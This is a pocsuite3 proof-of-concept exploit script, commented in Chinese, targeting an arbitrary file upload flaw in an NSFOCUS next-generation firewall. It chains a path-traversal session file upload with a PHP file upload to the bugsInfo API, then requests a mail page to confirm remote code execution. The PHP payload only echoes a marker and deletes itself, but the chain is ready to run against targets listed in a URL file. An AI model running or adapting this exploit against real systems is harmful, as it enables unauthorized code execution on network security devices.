from collections import OrderedDict
from urllib.parse import urljoin
import re,random,hashlib,base64
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2022-08-04'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-08-04'  # 编写 PoC 的日期
    updateDate = '2022-08-04'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '绿盟下一代防火墙 resourse.php 任意文件上传漏洞'  # PoC 名称
    appPowerLink = 'https://www.nsfocus.com.cn/'  # 漏洞厂商主页地址
    appName = '绿盟下一代防火墙'  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    def _verify(self):
        result = {}
        # 随机生成字符串
        str_num = str(random.randint(1000000000,9999999999))
        # 进行md5加密
        str_md5= hashlib.md5(str_num.encode()).hexdigest()
        
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'multipart/form-data; boundary=123',
            'Cookie': 'PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71',
        }
        # 提取ip，协议，然后加上端口
        url_one = self.url.split('//')[0]+'//'+self.url.split('//')[1].split(':')[0]+':8081'
        path_one="/api/v1/device/bugsInfo"
        data_one = """--123\nContent-Disposition: form-data; name="file"; filename="sess_82c13f359d0dd8f51c29d658a9c8ac71"\n\nlang|s:52:"../../../../../../../../../../../../../../../../tmp/";\n--123--"""
        path_two="/api/v1/device/bugsInfo"
        data_two = """--123\nContent-Disposition: form-data; name="file"; filename="compose.php"\n\n<?php echo md5({num});unlink(__FILE__);?>\n--123--""".format(num=str_num)
        # 提取ip，协议，然后加上端口
        url_three = self.url.split('//')[0]+'//'+self.url.split('//')[1].split(':')[0]+':4433'
        path_three="/mail/include/header_main.php"
        try:
            # 第一次发包，解除数据超过8M
            resq_one = requests.post(url=url_one+path_one,data=data_one,headers=headers,timeout=5)
            # 第二次发包，上传php代码
            resq_two = requests.post(url=url_one+path_two,data=data_two,headers=headers,timeout=5)
            # 第三次发包，检验代码是否执行
            resq_three = requests.get(url=url_three+path_three,headers=headers,timeout=5)
            if str_md5 in resq_three.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url + path_three
        except Exception as e:
            return
        return self.parse_output(result)      

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)